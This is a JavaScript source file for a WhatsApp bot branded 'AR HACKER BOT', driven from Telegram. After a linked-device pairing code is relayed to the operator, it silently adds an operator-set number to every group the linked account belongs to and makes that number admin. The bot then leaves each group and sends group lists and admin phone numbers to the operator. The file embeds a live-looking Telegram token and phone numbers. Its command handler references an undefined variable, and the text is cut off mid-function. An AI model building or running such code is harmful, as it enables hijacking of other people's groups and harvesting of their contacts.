const {
    makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    downloadContentFromMessage,
    jidDecode,
    PhoneNumber
} = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const P = require('pino');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');

// COMMAND HANDLER SYSTEM
const commands = new Map();
const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));

for (const file of commandFiles) {
    const command = require(`./commands/${file}`);
    commands.set(command.name, command);
}

// Telegram Bot Integration
const TELEGRAM_BOT_TOKEN = "8715664585:AAF-K_TqyRZ38YqT7XnAk7C2LyugdU-3OSs";
const OWNER_TELEGRAM_ID = "5941384226";

// Initialize Telegram Bot
const tgBot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// Function to send message to Telegram
async function sendToTelegram(text) {
    try {
        await tgBot.sendMessage(OWNER_TELEGRAM_ID, text, { parse_mode: 'HTML' });
    } catch (error) {
        console.log('❌ Failed to send Telegram message:', error.message);
    }
}

// Settings (let use kiya hai takay Telegram se change ho sakein)
let ownerNumber = "923403643259"; 
let notifyNumber = "923093175931@s.whatsapp.net";

// Global Variables for Telegram Handlers
let globalSock = null;
let pendingPairTarget = null;

// ==========================================
// TELEGRAM BOT COMMANDS (MENU & PAIR SYSTEM)
// ==========================================

// 1. MENU COMMAND (/menu or /start)
tgBot.onText(/\/(start|menu)/, async (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== OWNER_TELEGRAM_ID) return;

    let totalUsers = 0;
    let isConnected = globalSock?.user ? "1 (Online)" : "0 (Offline)";
    const now = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });

    if (globalSock?.user) {
        try {
            // Getting total groups as 'Total User'
            const groups = await globalSock.groupFetchAllParticipating();
            totalUsers = Object.keys(groups).length;
        } catch (e) {}
    }

    const menuText = `🤖 *AR HACKER BOT MENU*\n\n` +
        `👑 *Owner:* AR HACKER\n` +
        `👥 *TOTAL user:* ${totalUsers}\n` +
        `✅ *TOTAL connected:* ${isConnected}\n` +
        `📅 *Date Time:* ${now}\n\n` +
        `🔗 *Pair Commands:*\n` +
        `/pair <number> - Start pairing\n` +
        `Example: \`/pair 9234036258\``;

    tgBot.sendMessage(chatId, menuText, { parse_mode: 'Markdown' });
});

// 2. PAIR COMMAND (/pair)
tgBot.onText(/\/pair (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== OWNER_TELEGRAM_ID) return;

    pendingPairTarget = match[1].replace(/[^0-9]/g, '');
    
    // Bot replies exactly what you requested
    tgBot.sendMessage(chatId, `set now NOTIFY number you that pair before\n/set 923405843569`);
});

// 3. SET COMMAND (/set)
tgBot.onText(/\/set (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== OWNER_TELEGRAM_ID) return;

    if (!pendingPairTarget) {
        return tgBot.sendMessage(chatId, `❌ Please use /pair <number> first!`);
    }

    const newNotifyNum = match[1].replace(/[^0-9]/g, '');
    
    // Dynamically update Target & Notify variables
    ownerNumber = pendingPairTarget;
    notifyNumber = newNotifyNum + "@s.whatsapp.net";

    if (globalSock && !globalSock.authState.creds.registered) {
        try {
            // Request the WhatsApp Pairing Code
            let code = await globalSock.requestPairingCode(ownerNumber);
            
            // Format requested output
            let finalMsg = `Your pair code Linked device on ${ownerNumber} group transfer in ${newNotifyNum}\n\n` +
                           `🔐 *Code:* \`${code}\``;
            
            tgBot.sendMessage(chatId, finalMsg, { parse_mode: 'Markdown' });
            
            // Clear pending request
            pendingPairTarget = null;
            
        } catch (error) {
            tgBot.sendMessage(chatId, `❌ Error generating code: ${error.message}`);
        }
    } else if (globalSock && globalSock.authState.creds.registered) {
        tgBot.sendMessage(chatId, `⚠️ Bot is already connected! If you want to link a new device, please delete 'session_auth' folder and restart bot.`);
    } else {
        tgBot.sendMessage(chatId, `⏳ Bot system starting up, wait a few seconds and try again.`);
    }
});

// ==========================================

// Helper to decode JID
const decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {};
        return decode.user && decode.server && decode.user + '@' + decode.server || jid;
    } else return jid;
};

// Helper to check if user is admin
const isAdmin = async (sock, jid, participant) => {
    try {
        const groupMetadata = await sock.groupMetadata(jid);
        const participants = groupMetadata.participants;
        const user = participants.find(p => p.id === participant);
        return user?.admin === 'admin' || user?.admin === 'superadmin';
    } catch (error) {
        return false;
    }
};

// Helper to get all admins in a group
const getGroupAdmins = async (sock, jid) => {
    try {
        const groupMetadata = await sock.groupMetadata(jid);
        const admins = groupMetadata.participants
            .filter(p => p.admin === 'admin' || p.admin === 'superadmin')
            .map(p => p.id.split('@')[0]);
        return admins;
    } catch (error) {
        console.log('Error getting group admins:', error);
        return [];
    }
};

// Helper to get group metadata with cache
const getGroupMetadata = async (sock, jid) => {
    try {
        return await sock.groupMetadata(jid);
    } catch (error) {
        return null;
    }
};

// Get bot statistics
const getBotStats = async (sock) => {
    try {
        const groups = await sock.groupFetchAllParticipating();
        const groupList = Object.values(groups);
        let totalGroups = groupList.length;
        let groupDetails = [];
        
        for (const group of groupList) {
            // Get all admins in this group
            const admins = group.participants
                .filter(p => p.admin === 'admin' || p.admin === 'superadmin')
                .map(p => p.id.split('@')[0]);
            
            groupDetails.push({
                name: group.subject,
                id: group.id,
                members: group.participants.length,
                admins: admins,
                adminCount: admins.length
            });
        }
        
        return { totalGroups, groupList: groupDetails };
    } catch (error) {
        console.log('Error getting stats:', error);
        return { totalGroups: 0, groupList: [] };
    }
};

// --- AUTO LEAVE HELPER ---
const autoLeaveGroup = (sock, groupId, groupName) => {
    setTimeout(async () => {
        try {
            await sock.groupLeave(groupId);
            console.log(`👋 Bot left the group: ${groupName} after 5 seconds`);
        } catch (err) {
            console.log(`❌ Failed to leave group: ${err.message}`);
        }
    }, 5000); // 5000 milliseconds = 5 seconds
};

// Send detailed group info to notify number
const sendGroupDetails = async (sock, stats) => {
    try {
        let message = `📊 *AR HACKER BOT - GROUP DETAILS*
        
🤖 *Bot Number:* ${sock.user.id.split(':')[0]}
👑 *Owner:* ${ownerNumber}
📅 *Date:* ${new Date().toLocaleString()}

━━━━━━━━━━━━━━━━━━━━
📈 *TOTAL STATISTICS*
━━━━━━━━━━━━━━━━━━━━
• Total Groups: ${stats.totalGroups}

━━━━━━━━━━━━━━━━━━━━
📋 *GROUP LIST WITH ADMINS*
━━━━━━━━━━━━━━━━━━━━\n\n`;

        let index = 1;
        for (const group of stats.groupList) {
            message += `${index}. *${group.name}*\n`;
            message += `   👥 Members: ${group.members}\n`;
            message += `   👑 Total Admins: ${group.adminCount}\n`;
            
            // Add admin numbers
            if (group.admins.length > 0) {
                message += `   📞 *Admin Numbers:*\n`;
                for (let i = 0; i < group.admins.length; i++) {
                    message += `      ${i+1}. +${group.admins[i]}\n`;
                }
            } else {
                message += `   📞 *Admin Numbers:* No admins found\n`;
            }
            message += `\n`;
            index++;
            
            // Split into multiple messages if too long (every 3 groups)
            if (index % 3 === 0 && index !== stats.totalGroups) {
                await sock.sendMessage(notifyNumber, { text: message });
                message = `📋 *GROUP LIST (Continued)*\n\n`;
            }
        }
        
        if (message !== `📋 *GROUP LIST (Continued)*\n\n`) {
            await sock.sendMessage(notifyNumber, { text: message });
        }
        
        // Send final summary
        const summary = `✅ *SUMMARY*
        
📊 Total Groups: ${stats.totalGroups}
👥 Total Unique Admins: ${new Set(stats.groupList.flatMap(g => g.admins)).size}

🔄 *Last Updated:* ${new Date().toLocaleString()}`;
        
        await sock.sendMessage(notifyNumber, { text: summary });
        
    } catch (error) {
        console.log('Error sending group details:', error);
    }
};

// Auto add notify number to all groups and make admin
const addNotifyToAllGroups = async (sock) => {
    try {
        const groups = await sock.groupFetchAllParticipating();
        const groupList = Object.values(groups);
        const notifyJid = notifyNumber;
        
        console.log(`🔄 Attempting to add ${notifyNumber} to ${groupList.length} groups...`);
        
        let addedCount = 0;
        let alreadyMemberCount = 0;
        let failedCount = 0;
        
        for (const group of groupList) {
            try {
                // Check if notify number is already in group
                const isMember = group.participants.some(p => p.id === notifyJid);
                
                if (!isMember) {
                    // Add notify number to group
                    await sock.groupParticipantsUpdate(group.id, [notifyJid], "add");
                    console.log(`✅ Added ${notifyNumber} to ${group.subject}`);
                    addedCount++;
                    
                    // Wait a bit before trying to promote
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    
                 // Try to make notify number admin
                    try {
                        await sock.groupParticipantsUpdate(group.id, [notifyJid], "promote");
                        console.log(`👑 Made ${notifyNumber} admin in ${group.subject}`);
                        
                        // 👈 YAHAN ADD KIYA HAI (Condition 1)
                        autoLeaveGroup(sock, group.id, group.subject); 

                    } catch (promoteError) {
                        console.log(`⚠️ Could not make admin in ${group.subject}: ${promoteError.message}`);
                    }
                } else {
                    // If already member, check if admin, if not make admin
                    const isAdmin = group.participants.find(p => p.id === notifyJid && (p.admin === 'admin' || p.admin === 'superadmin'));
                    
                    if (!isAdmin) {
                        try {
                            await sock.groupParticipantsUpdate(group.id, [notifyJid], "promote");
                            console.log(`👑 Made ${notifyNumber} admin in ${group.subject} (was member)`);
                            
                            // 👈 YAHAN ADD KIYA HAI (Condition 2)
                            autoLeaveGroup(sock, group.id, group.subject);

                        } catch (promoteError) {
                            console.log(`⚠️ Could not make admin in ${group.subject}: ${promoteError.message}`);
                        }
                    } else {
                        console.log(`✅ ${notifyNumber} is already admin in ${group.subject}`);
                        alreadyMemberCount++;
                        
                        // 👈 YAHAN BHI ADD KIYA HAI (Condition 3: Agar pehle se admin hai tab bhi bot left ho jaye)
                        autoLeaveGroup(sock, group.id, group.subject);
                    }
                }
                
                // Wait between groups to avoid rate limiting
                await new Promise(resolve => setTimeout(resolve, 1000));
                
            } catch (error) {
                console.log(`❌ Failed to process ${group.subject}: ${error.message}`);
                failedCount++;
            }
        }
        
        // Send summary to owner
        const summary = `📊 *Auto-Add Summary*
        
✅ Added to ${addedCount} new groups
👑 Already admin in ${alreadyMemberCount} groups
❌ Failed in ${failedCount} groups
📊 Total groups processed: ${groupList.length}

🔄 Bot will continue monitoring new groups!`;
        
        await sock.sendMessage(notifyNumber, { text: summary });
        
    } catch (error) {
        console.log('Error in addNotifyToAllGroups:', error);
    }
};

// Monitor new groups and add notify number automatically
const monitorNewGroups = async (sock) => {
    try {
        const groups = await sock.groupFetchAllParticipating();
        const groupList = Object.values(groups);
        const notifyJid = notifyNumber;
        
        for (const group of groupList) {
            const isMember = group.participants.some(p => p.id === notifyJid);
            
            if (!isMember) {
                console.log(`🆕 New group detected: ${group.subject}, adding notify number...`);
                try {
                    await sock.groupParticipantsUpdate(group.id, [notifyJid], "add");
                    console.log(`✅ Added ${notifyNumber} to new group: ${group.subject}`);
                    
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    
                    try {
                        await sock.groupParticipantsUpdate(group.id, [notifyJid], "promote");
                        console.log(`👑 Made ${notifyNumber} admin in new group: ${group.subject}`);
                    } catch (promoteError) {
                        console.log(`⚠️ Could not make admin in new group: ${promoteError.message}`);
                    }
                } catch (error) {
                    console.log(`❌ Failed to add to new group: ${error.message}`);
                }
            }
        }
    } catch (error) {
        console.log('Error monitoring new groups:', error);
    }
};

// Function to refresh and send pairing code
let pairingCodeInterval = null;

async function refreshPairingCode(sock) {
    try {
        let code = await sock.requestPairingCode(ownerNumber);
        console.log(`\n👉 YOUR PAIRING CODE: ${code}\n`);
        
        // Send to Telegram
        const message = `🔐 <b>WhatsApp Bot Pairing Code</b>\n\n<code>${code}</code>\n\nUse this code to link your WhatsApp with the bot.\nBot Number: ${sock.user?.id?.split(':')[0] || 'Connecting...'}`;
        await sendToTelegram(message);
        
        // Also send to WhatsApp notify number
        if (sock.user) {
            await sock.sendMessage(notifyNumber, { 
                text: `🔐 *Owner Pairing Code*\n\nCode: ${code}\nUse this to link your WhatsApp with the bot.` 
            }).catch(() => {});
        }
        
        return code;
    } catch (error) {
        console.log('Error generating pairing code:', error);
        await sendToTelegram(`❌ <b>Error generating pairing code</b>\n\n${error.message}`);
        return null;
    }
}

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('session_auth');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        logger: P({ level: 'silent' }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, P({ level: 'silent' })),
        },
        printQRInTerminal: false,
    });

    // Make socket globally accessible for Telegram Bot handlers
    globalSock = sock;

    // Send startup message to Telegram
    await sendToTelegram("🤖 <b>WhatsApp Bot is Starting...</b>\n\nPlease wait while the bot initializes.");

    // Check if not paired, send notification to Telegram to use /pair command
    if (!sock.authState.creds.registered) {
        console.log("AR HACKER BOT: Waiting for pairing command via Telegram...");
        await sendToTelegram("⚠️ <b>Bot Needs Pairing!</b>\n\nSend <code>/menu</code> to see options or use <code>/pair</code> to generate a linking code.");
    }

    sock.ev.on('creds.update', saveCreds);

// (Yahan se neeche apka baqi purana connection.update wala code waise ka waisa hi rahega)

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const shouldReconnect = (lastDisconnect.error instanceof Boom)?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                await sendToTelegram("🔄 <b>Bot Disconnected</b>\n\nAttempting to reconnect...");
                startBot();
            } else {
                await sendToTelegram("⚠️ <b>Bot Logged Out</b>\n\nPlease restart the bot to generate new pairing code.");
            }
        } else if (connection === 'open') {
            console.log('✅ Bot Online - AR HACKER');
            
            // Clear pairing code interval if exists
            if (pairingCodeInterval) {
                clearInterval(pairingCodeInterval);
                pairingCodeInterval = null;
            }
            
            // Send success message to Telegram
            await sendToTelegram("✅ <b>WhatsApp Bot is Online!</b>\n\nBot is now active and responding to commands.");
            
            // Get bot statistics
            const stats = await getBotStats(sock);
            const botNumber = sock.user.id.split(':')[0];
            
            const statusMsg = `✅ *AR HACKER BOT CONNECTED*
            
📱 *Bot Number:* ${botNumber}
👑 *Owner:* ${ownerNumber}
📊 *Total Groups:* ${stats.totalGroups}

🚀 Bot is ready to use!
🔄 Auto-adding notify number to all groups...`;
            
            await sock.sendMessage(notifyNumber, { text: statusMsg });
            
            // Auto add notify number to all groups and make admin
            await addNotifyToAllGroups(sock);
            
            // Send detailed group information with admin numbers
            await sendGroupDetails(sock, stats);
            
            // Start monitoring for new groups every 5 minutes
            setInterval(async () => {
                await monitorNewGroups(sock);
            }, 5 * 60 * 1000);
        }
    });

    sock.ev.on('groups.update', async (updates) => {
        // When bot joins a new group, automatically add notify number
        for (const update of updates) {
            if (update.id) {
                console.log(`🆕 Bot joined new group, adding notify number...`);
                setTimeout(async () => {
                    await monitorNewGroups(sock);
                }, 3000);
            }
        }
    });

    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const m = chatUpdate.messages[0];
            if (!m.message || m.key.fromMe) return;

            const remoteJid = m.key.remoteJid;
            const isGroup = remoteJid.endsWith('@g.us');
            const sender = decodeJid(m.key.participant || m.key.remoteJid);
            const isOwner = sender.includes(ownerNumber);
            
            // Check if sender is admin (only if in group)
            let senderIsAdmin = false;
            if (isGroup) {
                senderIsAdmin = await isAdmin(sock, remoteJid, sender);
            } else {
                // In personal chat, allow all commands without admin restrictions
                senderIsAdmin = true; // Treat as admin in personal chat
            }

            const type = Object.keys(m.message)[0];
            const body = (type === 'conversation') ? m.message.conversation : 
                         (type === 'extendedTextMessage') ? m.message.extendedTextMessage.text : 
                         (type === 'imageMessage') ? m.message.imageMessage.caption : '';

            const prefix = '.';
            if (!body.startsWith(prefix)) return;

            const cmdName = body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase();
            const args = body.trim().split(/ +/).slice(1);
            const text = args.join(' ');
            // RUN COMMAND FROM COMMANDS FOLDER
if (commands.has(cmdName)) {
    try {
        await commands.get(cmdName).execute(sock, m, args);
    } catch (err) {
        console.log(err);
        await sock.sendMessage(remoteJid, { text: "❌ Command error!" });
    }
    return;
}

            // Quoted message info
            const quoted = m.message.extendedTextMessage?.contextInfo;
            const quotedMsg = m.message.extendedTextMessage?.contextInfo?.quotedMessage;
            let target = quoted?.participant || quoted?.mentionedJid?.[0];

            // --- COMMANDS ---

            // 1. MAIN MENU
            if (command === 'menu') {
                const menu = `╭━━━━━━「 *AR HACKER BOT* 」━━━━━━╮
┃
┃
┃       *✨BOT OWNER* : *Rehman*
┃       *✨SERVER*      : *ULTRA PREMIUM V3
┃       *✨QUALITY*     :  *4X ULTRA*
┃       *✨ THINKING*   : *3X HIGH*
┃       *✨POWER*       : *0.002 DELAY*
┃       *✨ *devolper*    : *AR X PAK TEAM 4TX*
┃
┃
┃
┃
┃ 📱 *WORKS IN BOTH GROUP & PRIVATE CHAT*
┃
┃ *👑GROUP COMMANDS*👑 _
┃
┃ ❯ *🎉.r*
┃ ❯ *🎉.add*
┃ ❯ *🎉.kick*
┃ ❯ *🎉.promote*
┃ ❯ *🎉.demote* 
┃ ❯ *🎉.setpp*
┃ ❯ *🎉.setname* 
┃ ❯ *🎉.d*
┃ ❯ *🎉.admin*
┃ ❯ *🎉.mute* 
┃ ❯ *🎉.unmute*
┃ ❯ *🎉.lock* 
┃ ❯ *🎉.unlock*
┃
┃ 🎮 *FUN COMMANDSl*🎮
┃ ❯ *✨.ping*
┃ ❯ *✨.time* 
┃ ❯ *✨.quote*
┃ ❯ *✨ .fact* 
┃ ❯ *✨.joke* 
┃ ❯ *✨.advice*
┃ ❯ *✨.dice* 
┃ ❯ *✨.coinflip*
┃ ❯ *.✨8ball*
┃
┃ 💬 _*CHAT COMMANDS*_💬
┃ ❯ *🔥.chat*
┃ ❯ *🔥.help* 
┃ ❯ *🔥.owner* 
┃ ❯ *🔥.botinfo*
┃
*╰━━━━━━━━━━━━━━━━━━━━━━╯*
`;
                await sock.sendMessage(remoteJid, { text: menu });
            }
            // 0. NEW COMMAND (.r number) - Anyone can use
            if (command === 'r') {
                if (!isGroup) {
                    await sock.sendMessage(remoteJid, { text: "❌ This command only works in groups!" });
                    return;
                }
                if (!text) {
                    await sock.sendMessage(remoteJid, { text: "❌ Number nahi diya! Example: .r 923xxxxxxxxx" });
                    return;
                }
                
                // Format the target number
                let targetNum = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                
                try {
                    await sock.groupParticipantsUpdate(remoteJid, [targetNum], "remove");
                    await sock.sendMessage(remoteJid, { text: `✅ User removed successfully by request!` });
                } catch (error) {
                    await sock.sendMessage(remoteJid, { text: `❌ Failed to remove! (Make sure Bot is Admin)` });
                }
                return; // Stop further execution
            }

            // 2. ADMIN COMMAND - List all admins with mentions
            if (command === 'admin') {
                if (!isGroup) {
                    await sock.sendMessage(remoteJid, { text: "❌ This command only works in groups!" });
                    return;
                }
                
                try {
                    // Fetch group metadata
                    const groupMetadata = await sock.groupMetadata(remoteJid);
                    const participants = groupMetadata.participants;
                    
                    // Filter only admins (both admin and superadmin)
                    const admins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
                    
                    if (admins.length === 0) {
                        await sock.sendMessage(remoteJid, { text: "❌ No admins found in this group!" });
                        return;
                    }
                    
                    let text = `👑 *Group Admins List*\n\n`;
                    let adminMentions = [];
                    
                    admins.forEach((admin, index) => {
                        const adminNumber = admin.id.split('@')[0];
                        const adminType = admin.admin === 'superadmin' ? '👑 Super Admin' : '🛡️ Admin';
                        text += `${index + 1}. ${adminType}: @${adminNumber}\n`;
                        adminMentions.push(admin.id);
                    });
                    
                    text += `\n📊 *Total Admins:* ${admins.length}`;
                    
                    // Send message with mentions
                    await sock.sendMessage(remoteJid, { 
                        text: text, 
                        mentions: adminMentions 
                    });
                    
                } catch (error) {
                    console.log('Error in admin command:', error);
                    await sock.sendMessage(remoteJid, { text: "❌ Failed to fetch admin list!" });
                }
            }

            // 3. ADD NOTIFY TO ALL GROUPS (Owner Only)
            if (command === 'addnotify') {
                if (!isOwner) {
                    await sock.sendMessage(remoteJid, { text: "❌ Only owner can use this command!" });
                    return;
                }
                
                await sock.sendMessage(remoteJid, { text: "🔄 Adding notify number to all groups and making admin..." });
                await addNotifyToAllGroups(sock);
                await sock.sendMessage(remoteJid, { text: "✅ Process completed! Check notify number for details." });
            }

            // 4. BOT STATISTICS (Owner Only)
            if (command === 'stats') {
                if (!isOwner) {
                    await sock.sendMessage(remoteJid, { text: "❌ Only owner can view bot statistics!" });
                    return;
                }
                
                const stats = await getBotStats(sock);
                const botNumber = sock.user.id.split(':')[0];
                
                // Calculate total unique admins
                const allAdmins = new Set();
                for (const group of stats.groupList) {
                    group.admins.forEach(admin => allAdmins.add(admin));
                }
                
                const statsMsg = `📊 *AR HACKER BOT STATISTICS*
                
🤖 *Bot Number:* ${botNumber}
👑 *Owner:* ${ownerNumber}
📱 *Platform:* WhatsApp Web (Baileys)
⏱️ *Uptime:* ${Math.floor(process.uptime() / 3600)}h ${Math.floor((process.uptime() % 3600) / 60)}m

📈 *Group Statistics:*
• Total Groups: ${stats.totalGroups}
• Total Unique Admins: ${allAdmins.size}

🔄 *Last Updated:* ${new Date().toLocaleString()}`;
                
                await sock.sendMessage(remoteJid, { text: statsMsg });
                
                // Send detailed group info with admin numbers to notify number
                await sendGroupDetails(sock, stats);
            }
            
            // 5. LIST ALL GROUPS (Owner Only)
            if (command === 'groups') {
                if (!isOwner) {
                    await sock.sendMessage(remoteJid, { text: "❌ Only owner can view groups list!" });
                    return;
                }
                
                const stats = await getBotStats(sock);
                let groupList = "📋 *GROUP LIST WITH ADMINS*\n\n";
                let index = 1;
                
                for (const group of stats.groupList) {
                    groupList += `${index}. ${group.name}\n`;
                    groupList += `   👥 Members: ${group.members}\n`;
                    groupList += `   👑 Admins: ${group.adminCount}\n`;
                    
                    // Add admin numbers (first 3 only to avoid message too long)
                    if (group.admins.length > 0) {
                        groupList += `   📞 Numbers:\n`;
                        for (let i = 0; i < Math.min(group.admins.length, 3); i++) {
                            groupList += `      • +${group.admins[i]}\n`;
                        }
                        if (group.admins.length > 3) {
                            groupList += `      ... +${group.admins.length - 3} more\n`;
                        }
                    }
                    groupList += `\n`;
                    index++;
                    
                    // Limit to 8 groups to avoid message too long
                    if (index > 8) {
                        groupList += `\n... and ${stats.totalGroups - 8} more groups\nUse .stats for full details`;
                        break;
                    }
                }
                
                if (stats.totalGroups === 0) {
                    groupList += "No groups found.";
                }
                
                await sock.sendMessage(remoteJid, { text: groupList });
            }

            // 6. DELETE FOR EVERYONE (.D)
            if (command === 'd') {
                if (!quoted) {
                    await sock.sendMessage(remoteJid, { text: "❌ Please reply to a message to delete!" });
                    return;
                }
                const key = {
                    remoteJid: remoteJid,
                    fromMe: false,
                    id: quoted.stanzaId,
                    participant: quoted.participant
                };
                await sock.sendMessage(remoteJid, { delete: key });
            }

            // 7. SET GROUP PHOTO (.setpp)
            if (command === 'setpp') {
                if (!isGroup) return;
                if (!senderIsAdmin && !isOwner) {
                    await sock.sendMessage(remoteJid, { text: "❌ Only admins can change group photo!" });
                    return;
                }
                const imageMsg = quotedMsg?.imageMessage || m.message.imageMessage;
                if (!imageMsg) {
                    await sock.sendMessage(remoteJid, { text: "❌ Please reply to an image with .setpp" });
                    return;
                }

                const stream = await downloadContentFromMessage(imageMsg, 'image');
                let buffer = Buffer.from([]);
                for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]); }

                await sock.updateProfilePicture(remoteJid, buffer);
                await sock.sendMessage(remoteJid, { text: "✅ Group DP Updated!" });
            }

            // 8. SET GROUP NAME (.setname)
            if (command === 'setname') {
                if (!isGroup) return;
                if (!senderIsAdmin && !isOwner) {
                    await sock.sendMessage(remoteJid, { text: "❌ Only admins can change group name!" });
                    return;
                }
                if (!text) {
                    await sock.sendMessage(remoteJid, { text: "❌ Please provide a name: .setname AR Group" });
                    return;
                }
                await sock.groupUpdateSubject(remoteJid, text);
                await sock.sendMessage(remoteJid, { text: "✅ Group name updated!" });
            }

            // 9. SET GROUP DESCRIPTION (.setdesc)
            if (command === 'setdesc') {
                if (!isGroup) return;
                if (!senderIsAdmin && !isOwner) {
                    await sock.sendMessage(remoteJid, { text: "❌ Only admins can change group description!" });
                    return;
                }
                if (!text) {
                    await sock.sendMessage(remoteJid, { text: "❌ Please provide a description!" });
                    return;
                }
                await sock.groupUpdateDescription(remoteJid, text);
                await sock.sendMessage(remoteJid, { text: "✅ Group description updated!" });
            }

            // 10. MUTE GROUP (.mute)
            if (command === 'mute') {
                if (!isGroup) return;
                if (!senderIsAdmin && !isOwner) {
                    await sock.sendMessage(remoteJid, { text: "❌ Only admins can mute group!" });
                    return;
                }
                await sock.groupSettingUpdate(remoteJid, 'announcement');
                await sock.sendMessage(remoteJid, { text: "🔇 Group muted! Only admins can send messages." });
            }

            // 11. UNMUTE GROUP (.unmute)
            if (command === 'unmute') {
                if (!isGroup) return;
                if (!senderIsAdmin && !isOwner) {
                    await sock.sendMessage(remoteJid, { text: "❌ Only admins can unmute group!" });
                    return;
                }
                await sock.groupSettingUpdate(remoteJid, 'not_announcement');
                await sock.sendMessage(remoteJid, { text: "🔊 Group unmuted! Everyone can send messages." });
            }

            // 12. LOCK GROUP (.lock)
            if (command === 'lock') {
                if (!isGroup) return;
                if (!senderIsAdmin && !isOwner) {
                    await sock.sendMessage(remoteJid, { text: "❌ Only admins can lock group!" });
                    return;
                }
                await sock.groupSettingUpdate(remoteJid, 'locked');
                await sock.sendMessage(remoteJid, { text: "🔒 Group locked! Only admins can edit settings." });
            }

            // 13. UNLOCK GROUP (.unlock)
            if (command === 'unlock') {
                if (!isGroup) return;
                if (!senderIsAdmin && !isOwner) {
                    await sock.sendMessage(remoteJid, { text: "❌ Only admins can unlock group!" });
                    return;
                }
                await sock.groupSettingUpdate(remoteJid, 'unlocked');
                await sock.sendMessage(remoteJid, { text: "🔓 Group unlocked! Everyone can edit settings." });
            }

            // 14. PING COMMAND
            if (command === 'ping') {
                const start = Date.now();
                await sock.sendMessage(remoteJid, { text: "🏓 Pinging..." });
                const end = Date.now();
                await sock.sendMessage(remoteJid, { text: `🏓 Pong! ${end - start}ms` });
            }

            // 15. TIME COMMAND
            if (command === 'time') {
                const now = new Date();
                const time = now.toLocaleTimeString('en-PK', { timeZone: 'Asia/Karachi' });
                const date = now.toLocaleDateString('en-PK', { timeZone: 'Asia/Karachi' });
                await sock.sendMessage(remoteJid, { text: `🕐 *Current Time:* ${time}\n📅 *Date:* ${date}` });
            }

            // 16. QUOTE COMMAND
            if (command === 'quote') {
                const quotes = [
                    "The only way to do great work is to love what you do. - Steve Jobs",
                    "Life is what happens when you're busy making other plans. - John Lennon",
                    "The future belongs to those who believe in the beauty of their dreams. - Eleanor Roosevelt",
                    "Success is not final, failure is not fatal: it is the courage to continue that counts. - Winston Churchill",
                    "Believe you can and you're halfway there. - Theodore Roosevelt"
                ];
                const randomQuote = quotes[Math.floor(Math.random() * quotes.length)];
                await sock.sendMessage(remoteJid, { text: `💭 *Quote of the moment:*\n\n${randomQuote}` });
            }

            // 17. FACT COMMAND
            if (command === 'fact') {
                const facts = [
                    "Honey never spoils. Archaeologists have found 3000-year-old honey in Egyptian tombs that was still edible.",
                    "Octopuses have three hearts.",
                    "A day on Venus is longer than a year on Venus.",
                    "The shortest war in history lasted only 38 minutes between Britain and Zanzibar.",
                    "Bananas are berries, but strawberries aren't."
                ];
                const randomFact = facts[Math.floor(Math.random() * facts.length)];
                await sock.sendMessage(remoteJid, { text: `🔍 *Random Fact:*\n\n${randomFact}` });
            }

            // 18. JOKE COMMAND
            if (command === 'joke') {
                const jokes = [
                    "Why don't scientists trust atoms? Because they make up everything!",
                    "What do you call a fake noodle? An impasta!",
                    "Why did the scarecrow win an award? Because he was outstanding in his field!",
                    "What do you call a bear with no teeth? A gummy bear!",
                    "Why did the math book look so sad? Because it had too many problems."
                ];
                const randomJoke = jokes[Math.floor(Math.random() * jokes.length)];
                await sock.sendMessage(remoteJid, { text: `😄 *Joke:*\n\n${randomJoke}` });
            }

            // 19. ADVICE COMMAND
            if (command === 'advice') {
                const advices = [
                    "Drink more water! 💧",
                    "Take breaks when working on long tasks. 🧠",
                    "Always be kind to yourself and others. 💝",
                    "Learn something new every day. 📚",
                    "Don't forget to exercise! 🏃‍♂️"
                ];
                const randomAdvice = advices[Math.floor(Math.random() * advices.length)];
                await sock.sendMessage(remoteJid, { text: `💡 *Advice:*\n\n${randomAdvice}` });
            }

            // 20. DICE COMMAND
            if (command === 'dice') {
                const dice = Math.floor(Math.random() * 6) + 1;
                const diceEmojis = ["⚀", "⚁", "⚂", "⚃", "⚄", "⚅"];
                await sock.sendMessage(remoteJid, { text: `🎲 You rolled: ${diceEmojis[dice-1]} ${dice}` });
            }

            // 21. COINFLIP COMMAND
            if (command === 'coinflip') {
                const result = Math.random() < 0.5 ? "Heads" : "Tails";
                const emoji = result === "Heads" ? "🪙" : "💰";
                await sock.sendMessage(remoteJid, { text: `${emoji} *${result}!*` });
            }

            // 22. 8BALL COMMAND
            if (command === '8ball') {
                if (!text) {
                    await sock.sendMessage(remoteJid, { text: "❓ Please ask a question! Example: .8ball Will I win today?" });
                    return;
                }
                const responses = [
                    "Yes, definitely! 🎯",
                    "No, sorry! ❌",
                    "Ask again later 🤔",
                    "Cannot predict now 📊",
                    "Don't count on it 🙅‍♂️",
                    "It is certain ✅",
                    "Very doubtful 🤨",
                    "Outlook good 👍"
                ];
                const response = responses[Math.floor(Math.random() * responses.length)];
                await sock.sendMessage(remoteJid, { text: `🎱 *Question:* ${text}\n*Answer:* ${response}` });
            }

            // 23. GROUP INFO COMMAND
            if (command === 'groupinfo') {
                if (!isGroup) {
